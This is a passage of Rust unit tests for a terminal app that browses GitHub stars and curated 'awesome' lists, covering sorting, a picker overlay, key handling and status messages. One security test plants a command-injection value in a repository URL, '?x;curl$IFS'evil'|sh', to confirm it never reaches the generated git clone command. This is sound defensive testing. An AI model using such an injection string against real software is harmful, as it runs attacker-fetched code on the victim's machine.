    fn category_resort_keeps_the_selected_category() {
        let mut a = sortable_app();
        a.handle_key(key(KeyCode::Left));
        for _ in 0..3 {
            a.handle_key(key(KeyCode::Down)); // Awesome, me's repos, Rust
        }
        assert_eq!(a.selected_category(), "Rust");
        a.set_cat_sort(CategorySort::Name);
        assert_eq!(a.selected_category(), "Rust");
        assert_eq!(names(&a).len(), 3);
    }

    // ── Awesome ─────────────────────────────────────────────────────────

    fn index() -> AwesomeIndex {
        crate::awesome::parse_index(include_str!("../tests/fixtures/awesome/index.md"))
    }

    fn sel(repo: &str, label: &str) -> Selection {
        Selection {
            repo: repo.into(),
            label: label.into(),
        }
    }

    /// Awesome rows: a GitHub repo you starred ("o/beta" is in `app()`), an
    /// unstarred one, and a non-GitHub link without metadata.
    fn awesome_rows() -> Vec<StarredRepo> {
        let mk = |id, full: &str, url: &str, stars, rank, external| StarredRepo {
            id,
            full_name: full.into(),
            name: full.into(),
            html_url: url.into(),
            stargazers_count: stars,
            rank,
            external,
            category: "Tools › CLI".into(),
            ..StarredRepo::test_default()
        };
        vec![
            mk(901, "zz/top", "https://github.com/zz/top", 50, 0, false),
            mk(902, "Site", "https://example.com/site", 0, 1, true),
            mk(903, "O/Beta", "https://github.com/o/beta", 900, 2, false),
        ]
    }

    /// `app()` with the index loaded and "o/awesome-x" chosen and delivered.
    fn awesome_app() -> App {
        let mut a = app();
        a.set_awesome(Some(index()), Some(sel("o/awesome-x", "Node.js")));
        a.drain_effects();
        a.apply(BgMsg::AwesomeList {
            repo: "o/awesome-x".into(),
            rows: awesome_rows(),
            done: true,
        });
        a
    }

    fn to_awesome(a: &mut App) {
        a.handle_key(key(KeyCode::Left));
        let pos = a.categories.iter().position(|(c, _)| c == AWESOME).unwrap();
        a.move_category(pos as isize - a.cat_sel as isize);
    }

    #[test]
    fn awesome_row_is_pinned_second_and_its_line_shows_only_while_selected() {
        let mut a = awesome_app();
        assert_eq!(a.categories[1], (AWESOME.to_string(), 3));
        assert!(!a.awesome_expanded(), "All is selected");
        to_awesome(&mut a);
        assert!(a.in_awesome() && a.awesome_expanded());
        a.handle_key(key(KeyCode::Down));
        assert!(!a.awesome_expanded(), "another row selected: line hidden");
        // Pinned under every category sort.
        a.set_cat_sort(CategorySort::Name);
        assert_eq!(a.categories[1].0, AWESOME);
    }

    #[test]
    fn startup_selection_requests_the_list() {
        let mut a = app();
        a.set_awesome(Some(index()), Some(sel("o/awesome-x", "Node.js")));
        assert_eq!(
            a.drain_effects(),
            vec![Effect::OpenAwesomeList {
                selection: sel("o/awesome-x", "Node.js"),
                force: false
            }]
        );
        assert!(a.awesome.loading);
    }

    #[test]
    fn picker_skips_headers_filters_and_chooses() {
        let mut a = app();
        a.set_awesome(Some(index()), None);
        to_awesome(&mut a);
        assert!(a.visible.is_empty(), "nothing chosen yet");
        a.handle_key(key(KeyCode::Enter));
        let Overlay::AwesomePicker { selected, .. } = a.overlay else {
            panic!("picker not open: {:?}", a.overlay)
        };
        let rows = picker_rows(a.awesome.index.as_ref().unwrap(), "");
        assert_eq!(
            rows[selected].name, "Node.js",
            "first choosable, not the section"
        );

        // Walking down never lands on the "Linux" group (no link of its own).
        let mut seen = Vec::new();
        for _ in 0..rows.len() {
            a.handle_key(ch('j'));
            let Overlay::AwesomePicker { selected, .. } = a.overlay else {
                unreachable!()
            };
            seen.push(rows[selected].name.clone());
        }
        assert!(
            seen.iter().all(|n| n != "Linux" && n != "Platforms"),
            "{seen:?}"
        );
        assert_eq!(
            seen.last().map(String::as_str),
            Some("Rust"),
            "clamped at the end"
        );

        // `/` filters; letters are text then (j is not "down").
        a.handle_key(ch('/'));
        for c in "cross j".chars() {
            a.handle_key(ch(c));
        }
        let Overlay::AwesomePicker { ref filter, .. } = a.overlay else {
            unreachable!()
        };
        assert_eq!(filter, "cross j");
        for _ in 0..2 {
            a.handle_key(key(KeyCode::Backspace));
        }
        a.handle_key(key(KeyCode::Enter));
        assert_eq!(a.overlay, Overlay::None);
        assert_eq!(a.focus, Focus::Repos);
        assert!(a.in_awesome());
        assert_eq!(
            a.drain_effects(),
            vec![Effect::OpenAwesomeList {
                selection: sel(
                    "bcoe/awesome-cross-platform-nodejs",
                    "Node.js › Cross-Platform"
                ),
                force: false
            }]
        );
    }

    #[test]
    fn picker_esc_clears_filter_then_closes() {
        let mut a = app();
        a.set_awesome(Some(index()), None);
        to_awesome(&mut a);
        a.handle_key(key(KeyCode::Enter));
        a.handle_key(ch('/'));
        for c in "zzzz".chars() {
            a.handle_key(ch(c)); // matches nothing: must not panic
        }
        a.handle_key(key(KeyCode::Down));
        a.handle_key(key(KeyCode::End));
        a.handle_key(key(KeyCode::Enter)); // nothing to choose: ends typing
        a.handle_key(key(KeyCode::Esc));
        assert!(
            matches!(&a.overlay, Overlay::AwesomePicker { filter, filtering: false, .. } if filter.is_empty())
        );
        a.handle_key(key(KeyCode::Esc));
        assert_eq!(a.overlay, Overlay::None);
        assert!(a.drain_effects().is_empty());
    }

    #[test]
    fn picker_without_index_warns() {
        let mut a = app();
        to_awesome(&mut a);
        a.handle_key(key(KeyCode::Enter));
        assert_eq!(a.overlay, Overlay::None);
        assert_eq!(a.status.as_ref().unwrap().level, Level::Warn);
    }

    #[test]
    fn awesome_rows_sort_list_order_and_stars() {
        let mut a = awesome_app();
        to_awesome(&mut a);
        a.set_sort(SortMode::StarredAt);
        assert_eq!(a.sort_label(), "List order");
        assert_eq!(names(&a), ["zz/top", "Site", "O/Beta"]);
        a.set_sort(SortMode::Stars);
        assert_eq!(
            names(&a),
            ["O/Beta", "zz/top", "Site"],
            "no stars sorts last"
        );
        // The starred view keeps its own meaning of the same mode.
        a.handle_key(key(KeyCode::Left));
        a.move_category(-(a.cat_sel as isize));
        a.set_sort(SortMode::StarredAt);
        assert_ne!(a.sort_label(), "List order");
    }

    #[test]
    fn stale_or_foreign_list_results_are_ignored() {
        let mut a = awesome_app();
        to_awesome(&mut a);
        a.apply(BgMsg::AwesomeList {
            repo: "other/list".into(),
            rows: vec![],
            done: true,
        });
        assert_eq!(a.visible.len(), 3);
        a.apply(BgMsg::AwesomeFailed {
            repo: "other/list".into(),
            error: "x".into(),
        });
        assert_eq!(a.awesome.error, None);
    }

    #[test]
    fn awesome_open_copy_and_unstar_rules() {
        let mut a = awesome_app();
        to_awesome(&mut a);
        a.set_sort(SortMode::StarredAt); // zz/top, Site, O/Beta
        a.handle_key(key(KeyCode::Right));
        a.handle_key(ch('g')); // sorting kept O/Beta selected; start at the top
        a.handle_key(key(KeyCode::Enter));
        assert_eq!(
            a.drain_effects(),
            vec![Effect::OpenExternal("https://github.com/zz/top".into())]
        );
        a.handle_key(ch('u'));
        assert_eq!(a.overlay, Overlay::None, "not in your stars");

        a.handle_key(ch('j')); // Site (not GitHub)
        a.handle_key(ch('Y'));
        assert!(a.drain_effects().is_empty(), "no git clone of a website");
        a.handle_key(ch('y'));
        assert_eq!(
            a.drain_effects(),
            vec![Effect::Copy("https://example.com/site".into())]
        );

        a.handle_key(ch('j')); // O/Beta, starred as "o/beta" (id 2 in app())
        a.handle_key(ch('u'));
        let Overlay::ConfirmUnstar { id, ref full_name } = a.overlay else {
            panic!("{:?}", a.overlay)
        };
        assert_eq!(
            (id, full_name.as_str()),
            (2, "o/beta"),
            "acts on the starred copy"
        );
    }

    #[test]
    fn clone_command_is_built_from_the_validated_name_only() {
        // Security review: the raw URL of a list entry must not reach a
        // command line.
        let mut a = awesome_app();
        a.apply(BgMsg::AwesomeList {
            repo: "o/awesome-x".into(),
            rows: vec![StarredRepo {
                id: 1 << 63 | 7,
                full_name: "o/r".into(),
                name: "o/r".into(),
                html_url: "https://github.com/o/r?x;curl$IFS'evil'|sh".into(),
                external: true,
                ..StarredRepo::test_default()
            }],
            done: true,
        });
        to_awesome(&mut a);
        a.handle_key(key(KeyCode::Right));
        a.handle_key(ch('Y'));
        assert_eq!(
            a.drain_effects(),
            vec![Effect::Copy("git clone https://github.com/o/r.git".into())]
        );
    }

    #[test]
    fn no_readme_request_for_non_github_rows() {
        let mut a = awesome_app();
        to_awesome(&mut a);
        a.set_sort(SortMode::StarredAt);
        a.handle_key(key(KeyCode::Right));
        a.handle_key(ch('g'));
        a.handle_key(ch('j')); // Site
        a.handle_key(ch('d'));
        a.tick(Instant::now() + Duration::from_secs(1));
        assert!(
            !a.drain_effects()
                .iter()
                .any(|e| matches!(e, Effect::FetchReadme { .. }))
        );
    }

    #[test]
    fn full_refresh_also_refetches_the_chosen_list() {
        let mut a = awesome_app();
        a.handle_key(ch('r'));
        assert_eq!(
            a.drain_effects(),
            vec![
                Effect::Sync { full: true },
                Effect::OpenAwesomeList {
                    selection: sel("o/awesome-x", "Node.js"),
                    force: true
                }
            ]
        );
    }

    #[test]
    fn mouse_rows_account_for_the_awesome_line() {
        let mut a = awesome_app();
        to_awesome(&mut a);
        // Row 0 All, rows 1-2 Awesome (+ its line), row 3 the next category.
        assert_eq!(a.category_at_row(0), Some(0));
        assert_eq!(a.category_at_row(1), Some(1));
        assert_eq!(a.category_at_row(2), Some(1));
        assert_eq!(a.category_at_row(3), Some(2));
    }

    #[test]
    fn picker_rows_filter_keeps_headers_and_parents() {
        let idx = index();
        let rows = picker_rows(&idx, "screensav");
        let names: Vec<&str> = rows.iter().map(|r| r.name.as_str()).collect();
        assert_eq!(names, ["Platforms", "macOS", "Screensavers"]);
        assert_eq!(rows[2].label, "macOS › Screensavers");
        assert!(!rows[1].selectable(), "link-less group");
        assert!(picker_rows(&idx, "zzzz").is_empty());
    }

    #[test]
    fn own_repos_view_absent_when_user_owns_none() {
        assert!(
            !app()
                .categories
                .iter()
                .any(|(c, _)| c.ends_with("'s repos"))
        );
    }

    #[test]
    fn startup_notice_survives_sync_completion() {
        let mut a = app();
        a.set_status(Level::Notice, "Upgraded v0.1 cache");
        a.progress = Some("Already up to date".into());
        a.apply(BgMsg::SyncDone(Box::new(StarCache {
            repos: a.repos.clone(),
            ..Default::default()
        })));
        let s = a.status.as_ref().unwrap();
        assert_eq!(
            (s.level, s.text.as_str()),
            (Level::Notice, "Upgraded v0.1 cache")
        );
        // Still visible after an Info message would have expired...
        a.tick(Instant::now() + Duration::from_secs(5));
        assert!(a.status.is_some());
        // ...and gone after its own longer lifetime.
        a.tick(Instant::now() + Duration::from_secs(16));
        assert!(a.status.is_none());
    }

    #[test]
    fn status_expires() {
        let mut a = app();
        a.set_status(Level::Info, "hi");
        assert!(!a.tick(Instant::now()) || a.status.is_some());
        a.tick(Instant::now() + Duration::from_secs(5));
        assert!(a.status.is_none());
    }

    #[test]
    fn ingest_sanitizes_text() {
        let mut r = repo(1, "x", 1, "Other", None);
        r.description = Some("\u{2699}\u{FE0F} gear \u{1F9D1}\u{200D}\u{1F527}".into());
        let a = App::new(
            "me",
            StarCache {
                repos: vec![r],
                ..Default::default()
            },
            SortMode::Stars,
            false,
        );
        assert_eq!(
            a.repos[0].description.as_deref(),
            Some("\u{2699} gear \u{1F9D1}")
        );
    }
}
